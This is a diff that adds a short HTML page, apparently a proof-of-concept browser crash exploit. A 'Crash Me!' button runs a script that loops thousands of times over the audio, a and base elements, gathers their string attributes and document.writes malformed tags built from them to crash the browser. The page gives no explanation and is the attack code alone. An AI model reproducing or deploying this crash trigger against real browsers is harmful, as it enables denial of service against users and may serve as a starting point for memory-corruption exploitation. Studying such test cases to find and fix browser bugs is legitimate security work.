@@ -1,0 +1,35 @@
+
+ &lt;html&gt;&lt;body&gt; 
+ &lt;script&gt; 
+  function getatts(str){
+    var cobj=document.createElement(str);
+    cobj.id=&quot;testcase&quot;;
+    document.body.appendChild(cobj);
+    var obj=document.getElementById(&quot;testcase&quot;);
+    var atts = new Array(); 
+    for(p in obj){
+      if(typeof(obj[p])==&quot;string&quot;){
+        atts.push(p);
+      }
+    }   
+    document.body.removeChild(cobj);
+    return atts;
+  }
+ 
+  function crashme() {
+    var tags = new Array(&quot;audio&quot;, &quot;a&quot;, &quot;base&quot;);
+    for (inx = 0; inx &lt; 0x8964; inx++) {
+        for (i = 0; i &lt; tags.length; i++) {
+            var atts = getatts(tags[i]);
+            for (j = 0; j &lt; atts.length; j++) {
+                var html = &quot;&lt;&quot; + tags[i] + &quot; &quot; + atts[j] + &quot;=a&gt;&lt;/&quot; + tags[i] +
+                           &quot;&gt;&quot; + tags[i];
+                document.write(html);
+            }
+        }
+    }
+  }
+&lt;/script&gt; 
+&lt;button onclick=&quot;crashme();&quot;&gt;Crash Me!&lt;/button&gt; 
+&lt;/body&gt;&lt;/html&gt; 
+
